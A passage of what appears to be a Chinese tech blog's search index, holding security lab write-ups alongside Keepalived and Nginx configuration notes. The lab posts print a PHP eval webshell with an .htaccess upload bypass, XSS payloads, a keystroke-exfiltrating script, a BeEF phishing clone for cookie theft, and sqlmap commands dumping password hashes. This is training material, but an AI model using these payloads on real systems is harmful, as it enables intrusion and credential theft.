使用蚁剑连接一句话木马（密码为一句话木马内容中的参数passwd）\n三、htaccess文件绕过 3.1 漏洞原理 htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现： 网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。上传.htaccess文件，来绕过黑名单。 前提条件 1.mod_rewrite模块开启。 2.AllowOverride All Upload-labs（Pass-04）源码分析，这个比03增加了黑名单量。但是，中间件为Apache的情况下，黑 名单未校验htaccess文件，导致可上传htaccess文件，绕过黑名单检测。\n源码如下：\n由于.htaccess还是没有过滤，可以重写文件解析规则绕过，上传一个 .htaccess。文件中配置可使得当前目录所有文件都使用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当作PHP执行。\n我们需要先准备好两个文件（ .htaccess 和 test.jpg）注意：.htaccess文件名就是 .htaccess ，不能修改为其它名称。该文件在windows如果不能直接修改名称，可打开记事本编辑后，选择另存为（保存类型：所有类型）即可生成。或者参考网上其它方式\n.htaccess:\n\u0026lt;FilesMatch \u0026#34;test.jpg\u0026#34;\u0026gt; Sethandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt; \u0026lt;IfModule mime_module\u0026gt; SetHandler application/x-httpd-php \u0026lt;/IfModule\u0026gt; test.jpg\n\u0026lt;?php @eval($_POST[\u0026#34;passwd\u0026#34;]);?\u0026gt; 3.2 开始绕过 3.2.1 上传.htaccess 3.2.2 上传test.jpg 3.2.3 使用蚁剑进行连接 ","permalink":"https://senmer.github.io/zh/posts/tech/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/","summary":"\u003cp\u003e（1）客户端绕过练习\n（2）服务端黑名单绕过：给出.htaccess文件绕过的具体步骤\u003c/p\u003e","title":"文件上传绕过"},{"content":"（1）使用pikachu平台练习XSS键盘记录、前台XSS盲打攻击获取cookie （2）使用beef进行钓鱼，获取用户cookie\n一、实验环境 软件名 版本 部署方式 IP地址 BeEF latest 安装命令：sudo apt install -y beef-xss 172.31.5.9 Pikachu Version 1.10 Development (Release date: 2015-10-08) 安装命令：docker run -d -p 80:80 \u0026ndash;name pikachu area39/pikachu 172.31.5.7 二、实验开始 2.1 XSS 盲打 XSS盲打是一种攻击场景，也是属于存储型XSS类型。 盲打的意思是无法直接在前端看到反馈效果，只有后台能看到输入的内容，从前端无法判断是否存在 XSS，这种情况下，我们直接往里面插入XSS代码，然后等待，当管理员查看时就会遭到xss攻击。\n打开pikachu盲打模块，输入常规的payload，然后提交\n\u0026lt;script\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt; 根据提示登录后台 http://172.31.5.7/vul/xss/xssblind/admin_login.php\n登录后弹窗，获得账号的cookie\n1.2 键盘记录\n键盘记录，利用pikachu自带脚本来实现\n查看脚本内容：\n[root@centos7 ~]# docker exec -it pikachu bash -c \u0026#34;cat /var/www/html/pkxss/rkeypress/rk.js\u0026#34; /** * Created by runner on 2018/7/8. */ function createAjax(){ var request=false; if(window.XMLHttpRequest){ request=new XMLHttpRequest(); if(request.overrideMimeType){ request.overrideMimeType(\u0026#34;text/xml\u0026#34;); } }else if(window.ActiveXObject){ var versions=[\u0026#39;Microsoft.XMLHTTP\u0026#39;, \u0026#39;MSXML.XMLHTTP\u0026#39;, \u0026#39;Msxml2.XMLHTTP.7.0\u0026#39;,\u0026#39;Msxml2.XMLHTTP.6.0\u0026#39;,\u0026#39;Msxml2.XMLHTTP.5.0\u0026#39;, \u0026#39;Msxml2.XMLHTTP.4.0\u0026#39;, \u0026#39;MSXML2.XMLHTTP.3.0\u0026#39;, \u0026#39;MSXML2.XMLHTTP\u0026#39;]; for(var i=0; i\u0026lt;versions.length; i++){ try{ request=new ActiveXObject(versions[i]); if(request){ return request; } }catch(e){ request=false; } } } return request; } var ajax=null; var xl=\u0026#34;datax=\u0026#34;; function onkeypress() { var realkey = String.fromCharCode(event.keyCode); xl+=realkey; show(); } document.onkeypress = onkeypress; function show() { ajax = createAjax(); ajax.onreadystatechange = function () { if (ajax.readyState == 4) { if (ajax.status == 200) { var data = ajax.responseText; } else { alert(\u0026#34;页面请求失败\u0026#34;); } } } var postdate = xl; ajax.open(\u0026#34;POST\u0026#34;, \u0026#34;http://192.168.1.15/pkxss/rkeypress/rkserver.php\u0026#34;,true); ajax.setRequestHeader(\u0026#34;Content-type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); ajax.setRequestHeader(\u0026#34;Content-length\u0026#34;, postdate.length); ajax.setRequestHeader(\u0026#34;Connection\u0026#34;, \u0026#34;close\u0026#34;); ajax.send(postdate); 修改脚本中的IP为pikachu地址\n[root@centos7 ~]# docker exec -it pikachu bash -c \u0026#34;sed -i \u0026#34;s/192\\.168\\.1\\.15/172.31.5.7/\u0026#34; /var/www/html/pkxss/rkeypress/rk.js\u0026#34; #查看修改结果 [root@centos7 ~]# docker exec -it pikachu bash -c \u0026#34;cat /var/www/html/pkxss/rkeypress/rk.js | grep http\u0026#34; ajax.open(\u0026#34;POST\u0026#34;, \u0026#34;http://172.31.5.7/pkxss/rkeypress/rkserver.php\u0026#34;,true); 在存储型XSS模块中输入payload\n\u0026lt;script src=\u0026#34;http://172.31.5.7/pkxss/rkeypress/rk.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 在当前标签页随意点击几个按键（如：test）\n登录后台\n获取到了键盘记录\n2.2 利用Beef-XSS获取cookie BeEF（Browser Exploitation Framework）是一款非常强大的Web框架攻击平台，集成了许多 payload，可以通过XSS漏洞配合JavaScript脚本和Metasploit进行渗透。基于Ruby语言编写，并且支持 图形化界面，操作简单。\n2.2.1 安装beef-xss 打开kali系统（172.31.5.9）\n#安装beef sudo apt install -y beef-xss 修改配置文件中的IP和默认密码（不修改无法启动）\n┌──(root㉿kali)-[/usr/share/beef-xss] └─# cat /usr/share/beef-xss/config.yaml |grep passwd passwd: \u0026#34;123\u0026#34; ┌──(root㉿kali)-[/usr/share/beef-xss] └─# cat /usr/share/beef-xss/config.yaml |grep host host: \u0026#34;172.31.5.9\u0026#34; 启动beef\ncd /usr/share/beef-xss \u0026amp;\u0026amp; ./beef 浏览器访问：http://172.31.5.9:3000/ui/panel\n使用账号 beef/123 登录：\n2.2.2 制作钓鱼页面 用法说明：\ncurl -H \u0026#34;Content-Type: application/json; charset=UTF-8\u0026#34; -d \u0026#39;{\u0026#34;url\u0026#34;:\u0026#34;\u0026lt;URL of site to clone\u0026gt;\u0026#34;, \u0026#34;mount\u0026#34;:\u0026#34;\u0026lt;where to mount\u0026gt;\u0026#34;}\u0026#39; -X POST http://\u0026lt;BeEFURL\u0026gt;/api/seng/clone_page?token=\u0026lt;token\u0026gt; // \u0026lt;URL of site to clone\u0026gt; 需要克隆的网址 // \u0026lt;where to mount\u0026gt; 克隆的页面在服务器的哪个路径访问 // \u0026lt;token\u0026gt; 服务启动时的 beef API key 示例：克隆百度主页面\n┌──(root㉿kali)-[/usr/share/beef-xss] └─# curl -H \u0026#34;Content-Type: application/json; charset=UTF-8\u0026#34; -d \u0026#39;{\u0026#34;url\u0026#34;:\u0026#34;https://www.baidu.com\u0026#34;,\u0026#34;mount\u0026#34;:\u0026#34;/baidu\u0026#34;}\u0026#39; -X POST http://172.31.5.9:3000/api/seng/clone_page?token=a7e0f6aaccfed873134b9f458f29824aaf9ebd7a {\u0026#34;success\u0026#34;:true,\u0026#34;mount\u0026#34;:\u0026#34;/baidu\u0026#34;} 克隆成功\n2.2.3 获取用户cookie 模拟用户访问该钓鱼页面 http://172.31.5.9:3000/baidu\n登陆beef，发现有机器上线\n获得用户cookie\n验证结果\n","permalink":"https://senmer.github.io/zh/posts/tech/xss/%E5%88%A9%E7%94%A8xss%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96cookie/","summary":"\u003cp\u003e（1）使用pikachu平台练习XSS键盘记录、前台XSS盲打攻击获取cookie\n（2）使用beef进行钓鱼，获取用户cookie\u003c/p\u003e","title":"利用XSS漏洞获取cookie"},{"content":"使用Sqlmap工具完成对DVWA数据库的注入过程，要求按照库、表、列、内容的顺序进行注入；\n一、 实验环境 软件名 版本 部署方式 IP地址 sqlmap 1.6.11#stable kali自带 172.31.5.38 DVWA Version 1.10 Development (Release date: 2015-10-08) docker run -d -p 80:80 docker.io/sagikazarmark/dvwa 172.31.5.7 二、 开始注入 2.1 进入DVWA SQL Injection模块 DVWA是需要登录的，因此爆破时需要携带cookie信息。\n在输入框输入数字1提交，在地址栏获得要注入的url（本案例中注入字段就是id）\n调整 DVWA Security 的安全级别为low\n2.2 判断注入点 ┌──(root㉿kali)-[~] └─# sqlmap --batch -u \u0026#34;http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;PHPSESSID=p8set09itok4kmnotmgr8tq9l5; security=low\u0026#34; -p id # -p 指定注入参数为id #获得数据库版本 web server operating system: Linux Debian 8 (jessie) web application technology: Apache 2.4.10 back-end DBMS: MySQL \u0026gt;= 5.0 2.3 获取mysql中的所有库 ┌──(root㉿kali)-[~] └─# sqlmap --batch -u \u0026#34;http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;PHPSESSID=p8set09itok4kmnotmgr8tq9l5; security=low\u0026#34; --dbs #获得数据库列表 available databases [4]: [*] dvwa [*] information_schema [*] mysql [*] performance_schema 2.4 获取dvwa库中的所有表 ┌──(root㉿kali)-[~] └─# sqlmap --batch -u \u0026#34;http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;PHPSESSID=p8set09itok4kmnotmgr8tq9l5; security=low\u0026#34; -D dvwa --tables #获得表 Database: dvwa [2 tables] +-----------+ | guestbook | | users | +-----------+ 2.5 获取users表中的所有字段 ┌──(root㉿kali)-[~] └─# sqlmap --batch -u \u0026#34;http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;PHPSESSID=p8set09itok4kmnotmgr8tq9l5; security=low\u0026#34; -D dvwa -T users --columns #获得表中的字段 Database: dvwa Table: users [8 columns] +--------------+-------------+ | Column | Type | +--------------+-------------+ | user | varchar(15) | | avatar | varchar(70) | | failed_login | int(3) | | first_name | varchar(15) | | last_login | timestamp | | last_name | varchar(15) | | password | varchar(32) | | user_id | int(6) | +--------------+-------------+ 2.6 获得user和password ┌──(root㉿kali)-[~] └─# sqlmap --batch -u \u0026#34;http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;PHPSESSID=p8set09itok4kmnotmgr8tq9l5; security=low\u0026#34; -D dvwa -T users -C last_name,password --dump #获得账号信息 Database: dvwa Table: users [5 entries] +-----------+---------------------------------------------+ | last_name | password | +-----------+---------------------------------------------+ | admin | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | | Brown | e99a18c428cb38d5f260853678922e03 (abc123) | | Me | 8d3533d75ae2c3966d7e0d4fcc69216b (charley) | | Picasso | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) | | Smith | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | +-----------+---------------------------------------------+ ","permalink":"https://senmer.github.io/zh/posts/tech/sql_injection/%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%E6%95%B0%E6%8D%AE%E5%BA%93/","summary":"\u003cp\u003e使用Sqlmap工具完成对DVWA数据库的注入过程，要求按照库、表、列、内容的顺序进行注入；\u003c/p\u003e","title":"使用sqlmap注入DVWA数据库"},{"content":"二进制安装Keepalived\n支持的系统：Centos7\n#!/bin/bash keepalived_version=\u0026#39;keepalived-2.0.20.tar.gz\u0026#39; source_package_path=\u0026#39;/usr/local/src/\u0026#39; yum -y install gcc gcc-c++ curl openssl-devel libnl3-devel net-snmp-devel [ ! -e $source_package_path/$keepalived_version ] \u0026amp;\u0026amp; wget https://keepalived.org/software/$keepalived_version -P $source_package_path cd $source_package_path \u0026amp;\u0026amp; tar xf $keepalived_version cd $source_package_path/$(echo $keepalived_version | sed -r \u0026#39;s/(.*).tar.gz/\\1/\u0026#39;)/ \u0026amp;\u0026amp; ./configure --prefix=/usr/local/keepalived --disable-fwmark # --prefix=/usr/local/keepalived 指定安装目录 make \u0026amp;\u0026amp; make install [ ! -d /etc/keepalived ] \u0026amp;\u0026amp; mkdir /etc/keepalived [ ! -f /etc/keepalived/keepalived.conf ] \u0026amp;\u0026amp; cat \u0026gt;\u0026gt; /etc/keepalived/keepalived.conf \u0026lt;\u0026lt; EOF global_defs { # notification_email { # root@localhost # } # notification_email_from keepalived@localhost # smtp_server 127.0.0.1 # smtp_connect_timeout 30 router_id node1 #修改此行 vrrp_skip_check_adv_addr vrrp_garp_interval 0 vrrp_gna_interval 0 vrrp_mcast_group4 224.0.0.22 } vrrp_instance VI_1 { state BACKUP interface ens33 virtual_router_id 66 priority 100 #修改此行 advert_int 1 authentication { auth_type PASS auth_pass 321321 } virtual_ipaddress { 172.31.5.20 ens33 label ens33:0 } } EOF ","permalink":"https://senmer.github.io/zh/posts/tech/shell/keepalived%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC/","summary":"\u003cp\u003e二进制安装Keepalived\u003c/p\u003e","title":"Keepalived安装脚本"},{"content":"Nginx实现网址重定向\nNginx服务器利用 ngx_http_rewrite_module 模块解析和处理rewrite请求，此功能依靠 PCRE(perl compatible regular expression)，因此编译之前要安装PCRE库，rewrite是nginx服务器的重要功能之一，用于实现URL的重写，URL的重写是非常有用的功能，比如它可以在我们改变网站结构之后，不需要客户端修改原来的书签，也无需其他网站修改我们的链接，就可以设置为访问，另外还可以在一定程度上提高网站的安全性。\nngx_http_rewrite_module 模块 官方文档： https://nginx.org/en/docs/http/ngx_http_rewrite_module.html\nif 指令 官方文档：https://nginx.org/en/docs/http/ngx_http_rewrite_module.html#if\nif指令用于条件匹配判断，并根据条件判断结果选择不同的Nginx配置，可以配置在server或location块中进行配置，Nginx的if语法仅能使用if做单次判断，不支持使用if else或者if elif这样的多重判断，用法如下：\nif （条件匹配） { action } if 指令使用正则表达式对变量进行匹配，匹配成功时if指令认为条件为true，否则认为false，支持以下条件判断运算符：\n= #比较变量和字符串是否相等，相等时if指令认为该条件为true，反之为false != #比较变量和字符串是否不相等，不相等时if指令认为条件为true，反之为false ~ #区分大小写字符，可以通过正则表达式匹配，满足匹配条件为真，不满足匹配条件为假 !~ #区分大小写字符,判断是否匹配，不满足匹配条件为真，满足匹配条件为假 ~* #不区分大小写字符，可以通过正则表达式匹配，满足匹配条件为真，不满足匹配条件为假 !~* #不区分大小字符,判断是否匹配，满足匹配条件为假，不满足匹配条件为真 -f 和 !-f #判断请求的文件是否存在和是否不存在 -d 和 !-d #判断请求的目录是否存在和是否不存在 -x 和 !-x #判断文件是否可执行和是否不可执行 -e 和 !-e #判断请求的文件或目录是否存在和是否不存在(包括文件，目录，软链接) #注意： #如果$变量的值为空字符串或0，则if指令认为该条件为false，其他条件为true。 #nginx 1.0.1之前$变量的值如果以0开头的任意字符串会返回false #示例： location /main { index index.html; default_type text/html; if ( $scheme = http ){ echo \u0026#34;if-----\u0026gt; $scheme\u0026#34;; } if ( $scheme = https ){ echo \u0026#34;if ----\u0026gt; $scheme\u0026#34;; } #if (-f $request_filename) { # echo \u0026#34;$request_filename is exist\u0026#34;; #} if (!-e $request_filename) { echo \u0026#34;$request_filename is not exist\u0026#34;; #return 409; } } set 指令 可以利用set指定定义变量，变量的值为字符串且支持字符串和nginx内置变量进行字符串拼接。\nlocation /main { root /data/nginx/html/pc; index index.html; default_type text/html; set $name magedu; echo $name; set $my_port $server_port; echo $my_port; } break 指令 用于中断当前相同作用域(location)中的其他Nginx指令，位于break指令后的其他指令不会执行。\nlocation /main { root /data/nginx/html/pc; index index.html; default_type text/html; set $name magedu; echo $name; break; #location块中break后面的其他ngx_http_rewrite_module模块指令不会执行（如set指令） set $my_port $server_port; echo $my_port; } return 指令 return用于完成对请求的处理，并直接向客户端返回响应状态码，比如:可以指定重定向URL(对于特殊重定向状态码，301/302等) 或者是指定提示文本内容(对于特殊状态码403/500等)，处于此指令后的所有配置都将不被执行，return可以在server、if 和 location块进行配置\n语法格式：\nreturn code; #返回给客户端指定的HTTP状态码 return code [text]; #返回给客户端的状态码及响应报文的实体内容，可以调用变量,其中text如果有空格,需要用单或双引号引起来 return code URL; #返回给客户端的URL地址 范例：\nservice error[root@centos7 nginx]# cat conf.d/pc.conf server { listen 80; server_name pc.test.org; location / { root /app/nginx/html/pc; default_type text/html; index index.html; if ($scheme = http) { #return 666; #return 666 \u0026#34;not allow http\u0026#34;; #return 301 http://www.baidu.com; return 500 \u0026#34;service error\u0026#34;; echo \u0026#34;if ------\u0026gt; $scheme\u0026#34;; #return 后面的指令不再执行 } }\t} ##访问测试 [root@centos7 nginx]# curl pc.test.org service error[root@centos7 nginx]# rewrite_log 指令 设置是否开启记录ngx_http_rewrite_module 模块日志记录到 error_log日志文件当中，可以配置在http、server、location 或 if 中\n注意：开启rewrite日志需要提前设置日志级别为notice\n##开启错误日志 [root@centos7 nginx]# cat /apps/nginx/conf/nginx.conf |grep error_log error_log logs/error.log notice; #开启rewrite_log [root@centos7 nginx]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location / { root /app/nginx/html/pc; default_type text/html; index index.html; set $name test; rewrite_log on; break; set $my_port $server_port; #由于只用了break指令，故set指令不会执行 echo $my_port; #echo指令将报错 }\t} #访问测试 [root@centos7 nginx]# curl pc.test.org #查看日志记录 [root@centos7 nginx]# tail -1 /apps/nginx/logs/error.log 2022/08/15 19:40:03 [warn] 1277#0: *7 using uninitialized \u0026#34;my_port\u0026#34; variable, client: 172.16.16.88, server: pc.test.org, request: \u0026#34;GET / HTTP/1.1\u0026#34;, host: \u0026#34;pc.test.org\u0026#34; rewrite 指令 通过正则表达式的匹配来改变URI，可以同时存在一个或多个指令，按照顺序依次对URI进行匹配，rewrite主要是针对用户请求的URL或者是URI做具体处理\n官方文档：https://nginx.org/en/docs/http/ngx_http_rewrite_module.html#rewrite\nrewrite可以配置在 server、location、if 块中\n语法格式：\nrewrite regex replacement [flag]; rewrite将用户请求的URI基于regex所描述的模式进行检查，匹配到时将其替换为表达式指定的新的URI\n注意：如果在同一级配置块中存在多个rewrite规则，那么会自下而下逐个检查; 被某条件规则替换完成后，会重新进行新一轮的替换检查，隐含有循环机制, 但不超过10次; 如果超过，提示500响应码，[flag]所表示的标志位用于控制此循环机制\n如果替换后的URL是以http://或https://开头，则替换结果会直接以重定向返回给客户端, 即永久重定向301\n正则表达式\n. #匹配除换行符以外的任意字符 \\w\t#匹配字母或数字或下划线或汉字 \\s #匹配任意的空白符 \\d #匹配数字 \\b #匹配单词的开始或结束 ^ #匹配字付串的开始 $ #匹配字符串的结束 * #匹配重复零次或更多次 + #匹配重复一次或更多次 ? #匹配重复零次或一次 (n) #匹配重复n次 {n,}\t#匹配重复n次或更多次 {n,m} #匹配重复n到m次 *? #匹配重复任意次，但尽可能少重复 +? #匹配重复1次或更多次，但尽可能少重复 ?? #匹配重复0次或1次，但尽可能少重复 {n,m}? #匹配重复n到m次，但尽可能少重复 {n,}? #匹配重复n次以上，但尽可能少重复 \\W #匹配任意不是字母，数字，下划线，汉字的字符 \\S #匹配任意不是空白符的字符 \\D #匹配任意非数字的字符 \\B #匹配不是单词开头或结束的位置 [^x] #匹配除了x以外的任意字符 [^magedu] #匹配除了magedu 这几个字母以外的任意字符 rewrite flag 使用介绍 利用nginx的rewrite的指令，可以实现url的重新跳转，rewrtie有四种不同的flag，分别是redirect(临时\n重定向302)、permanent(永久重定向301)、break和last。其中前两种是跳转型的flag，后两种是代理型\n跳转型指由客户端浏览器重新对新地址进行请求 代理型是在WEB服务器内部实现跳转 rewrite 格式\nSyntax: rewrite regex replacement [flag]; #通过正则表达式处理用户请求并返回替换后的数据包。 Default: — Context: server, location, if flag 说明\nredirect; #临时重定向，重写完成后以临时重定向方式直接返回重写后生成的新URL给客户端，由客户端重新发起请求;使用相对路径,或者http://或https://开头，状态码：302 permanent; #重写完成后以永久重定向方式直接返回重写后生成的新URL给客户端，由客户端重新发起请求，状态码：301 break; #重写完成后,停止对当前URL在当前location中后续的其它重写操作，而后直接跳转至重写规则配置块之后的其它配置;结束循环，建议在location中使用 #适用于一个URL一次重写 last; #重写完成后,停止对当前URI在当前location中后续的其它重写操作，而后对新的URL启动新一轮重写检查，不建议在location中使用 #适用于一个URL多次重写，要注意避免出现超过十次以及URL重写后返回错误的给用户 rewrite 案例：域名重定向 重定向分为临时重定向（301）和永久重定向（302），临时重定向不会缓存域名解析记录(A记录)，但是永久重定向会缓存。\n示例：因业务需要，需将访问源域名pc.test.com 的请求重定向到mobile.test.com\n##准备两个站点 [root@centos7 nginx]# curl pc.test.com pc_page [root@centos7 nginx]# curl mobile.test.com mobile_page ##配置跳转规则 [root@centos7 nginx]# cat conf.d/pc.conf server { listen 80; server_name pc.test.com; location / { root /apps/nginx/html/pc; default_type text/html; index index.html; #rewrite / http://mobile.test.com; #跳转至mobile.test.com }\t} #测试跳转 [root@centos7 nginx]# curl pc.test.com -L mobile_page 永久重定向 301 域名永久型调整，即域名永远跳转至另外一个新的域名，之前的域名再也不使用，跳转记录可以缓存到\n客户端浏览器\n永久重定向会缓存DNS解析记录, 浏览器中有 from disk cache 信息\n示例：访问www.360buy.com (京东早期域名）将永久跳转至 www.jd.com （磁盘缓存该跳转信息）\n临时重定向 302 域名临时重定向，告诉浏览器域名不是固定重定向到当前目标域名，后期可能随时会更改，因此浏览器\n不会缓存当前域名的解析记录，而浏览器会缓存永久重定向的DNS解析记录，这也是临时重定向与永久\n重定向最大的本质区别。\nrewrite 案例：break与last break 案例 [root@centos7 conf.d]# cat pc.conf server { listen 80; server_name pc.test.com; location /break { root html; index index.html; rewrite ^/break/(.*) /test/$1 break; #重写URL后，直接返回相应的请求结果 } location /test { return 666 \u0026#34;====end====\u0026#34;; } } [root@centos7 conf.d]# curl pc.test.com/break/ ====end====[root@centos7 conf.d]# #访问/break/** ，被重写为/test/**，但是重写后的路径并不存在，报错404 [root@centos7 conf.d]# curl pc.test.com/break/** \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;404 Not Found\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx/1.18.0\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; last 案例 [root@centos7 conf.d]# cat pc.conf server { listen 80; server_name pc.test.com; location /break { root html; index index.html; rewrite ^/break/(.*) /test/$1 last; #重写请求URL后，重新发起请求匹配location } location /test { return 666 \u0026#34;====end====\u0026#34;; } } [root@centos7 conf.d]# curl pc.test.com/break/ ====end====[root@centos7 conf.d]# #访问/break/**, 被重写为/test/** , 重新发起新的匹配请求，匹配到/test，返回相应结果 [root@centos7 conf.d]# curl pc.test.com/break/** ====end====[root@centos7 conf.d]# rewrite 案例：自动跳转https [root@centos7 conf.d]# cat pc.conf server { listen 80; listen 443 ssl; server_name pc.test.com; ssl_certificate /apps/nginx/certs/www.nginx.com.pem; ssl_certificate_key /apps/nginx/certs/www.nginx.com.key; ssl_session_cache shared:sslcache:20m; ssl_session_timeout 10m; location / { #配置全站https root html/pc; index index.html; if ($scheme = http) { # rewrite / https://$host redirect; } } location /login { #配置部分站点https加密，如登录界面 if ($scheme = http) { rewrite / https://$host/login redirect; } } } #访问测试，成功 [root@centos7 conf.d]# curl -ikL pc.test.com HTTP/1.1 302 Moved Temporarily Server: nginx/1.18.0 Date: Mon, 15 Aug 2022 17:43:20 GMT Content-Type: text/html Content-Length: 145 Connection: keep-alive Keep-Alive: timeout=60 Location: https://pc.test.com HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Mon, 15 Aug 2022 17:43:20 GMT Content-Type: text/html Content-Length: 8 Last-Modified: Mon, 15 Aug 2022 12:24:47 GMT Connection: keep-alive Keep-Alive: timeout=60 ETag: \u0026#34;62fa3b0f-8\u0026#34; Accept-Ranges: bytes pc_page rewrite 案例： 重定向错误页面到主页 案例：当用户访问一个不存在的URL时，将页面重定向至站点首页\n[root@centos7 conf.d]# cat pc.conf server { listen 80; server_name pc.test.com; location / { root html/pc; index index.html; if ( !-e $request_filename ) { #配置跳转规则 rewrite .* http://$host; } } } #访问不存在的页面测试 [root@centos7 conf.d]# curl pc.test.com/** -L pc_page [root@centos7 conf.d]# curl pc.test.com/kk -L pc_page 其他应用案例 #案例1:如果客户端浏览器包含MSIE，则rewrite客户端请求到/msie目录下 if ( $http_user_agent ~ MSIE){ rewrite ^(.*)$ /msie/$1 break; } #案例2: 更换目录访问方式, 目录转换为对象存储形式 #要求: #/20200106/static -\u0026gt;/static?id=20200106 #/20200123/image -\u0026gt;/image?id=20200123 rewrite ^/(\\d+)/(.+)/ /$2?id=$l last; #案例3:多目录转换访问方式 #要求: www.magedu.com/images/20200106/1.jpg =\u0026gt; www.magedu.com/index.do?name=images\u0026amp;dir=20200106=\u0026amp;file=1.jpg #规则配置: if ($host ~* (.*)\\.magedu\\.com) { rewrite ^/(.*)/(\\d+)/(.*)$ /index.do?name=$1\u0026amp;dir=$2\u0026amp;file=$3 last; } ","permalink":"https://senmer.github.io/zh/posts/tech/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/","summary":"\u003cp\u003eNginx实现网址重定向\u003c/p\u003e","title":"Nginx实现rewrite功能"},{"content":"Nginx 高级配置及第三方模块\nNginx 状态页 基于nginx 模块 ngx_http_stub_status_module 实现，在编译安装nginx的时候需要添加编译参数 \u0026ndash;with-http_stub_status_module\n注意：状态页显示的是整个服务器的状态，而非虚拟主机的状态\n配置示例\n[root@centos7 conf.d]# nginx -V #查看nginx编译参数，确定添加了ngx_http_stub_status_module模块 nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 TLS SNI support enabled configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module [root@centos7 conf.d]# pwd /apps/nginx/conf.d [root@centos7 conf.d]# cat pc.conf #编辑虚拟主机，添加状态页配置 server { listen 80 default_server; server_name pc.test.org; location /nginx_status { #状态页uri匹配规则 stub_status; } } ##访问测试 [root@centos7 conf.d]# curl pc.test.org/nginx_status/ Active connections: 1 server accepts handled requests 11 11 15 #分别对应accepts,handled,requests三个字段 Reading: 0 Writing: 1 Waiting: 0 ##参数解释 Active connections： #当前处于活动状态的客户端连接数（=reading+writing+waiting） accepts：#统计总值，Nginx自启动后已经接受的客户端请求连接的总数。 handled：#统计总值，Nginx自启动后已经处理完成的客户端请求连接总数，通常等于accepts，除非有因为worker_connections限制等被拒绝的连接 requests：#统计总值，Nginx自启动后客户端发来的总的请求数（单次连接可能发生多次请求）。 Reading：#当前状态，正在读取客户端请求报文首部的连接的连接数,数值越大,说明排队现象严重,性能不足 Writing：#当前状态，正在向客户端发送响应报文过程中的连接数,数值越大,说明访问量很大 Waiting：#当前状态，正在等待客户端发出请求的空闲连接数，开启 keep-alive的情况下,这个值等于active – (reading+writing) Nginx 第三方模块 第三方模块是对nginx 的功能扩展，第三方模块需要在编译安装nginx的时候使用参数\u0026ndash;add-module=PATH指定路径添加，有的模块是由公司的开发人员针对业务需求定制开发的，有的模块是开源爱好者开发好之后上传到github进行开源的模块，nginx的第三方模块需要从源码重新编译进行支持\n比如:开源的echo模块 https:/github.com/openresty/echo-nginx-module\n示例：添加第三方模块 echo-nginx-module\n#配置虚拟主机使用echo-nginx-module模块 [root@centos7 conf.d]# cat pc.conf server { listen 80 default_server; server_name pc.test.org; location /main { index index.html; default_type text/html; echo \u0026#34;hello world--\u0026gt;\u0026#34;; echo $remote_addr; echo_reset_timer; #将计时器开始时间重置为当前时间 echo_location /sub1; echo_location /sub2; echo \u0026#34;took $echo_time_elapsed sed for total.\u0026#34;; } } location /sub1 { echo_sleep 1; echo sub1; } location /sub2 { echo_sleep 1; echo sub2; } #语法检查报错 [root@centos7 conf.d]# nginx -t nginx: [emerg] unknown directive \u0026#34;echo\u0026#34; in /apps/nginx/conf.d/pc.conf:8 #不支持echo模块 nginx: configuration file /apps/nginx/conf/nginx.conf test failed #查看当前nginx并未添加echo-nginx-module模块 [root@centos7 conf.d]# nginx -V nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 TLS SNI support enabled configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module ###下载echo-nginx-mudule模块，重新编译nginx并添加此模块 [root@centos7 src]# nginx -s stop #停止老版本nginx [root@centos7 conf.d]# cd /usr/local/src [root@centos7 src]# git clone https:/github.com/openresty/echo-nginx-module.git [root@centos7 nginx-1.18.0]# ./configure \\ --prefix=/apps/nginx \\ --user=nginx --group=nginx \\ --with-http_ssl_module \\ --with-http_v2_module \\ 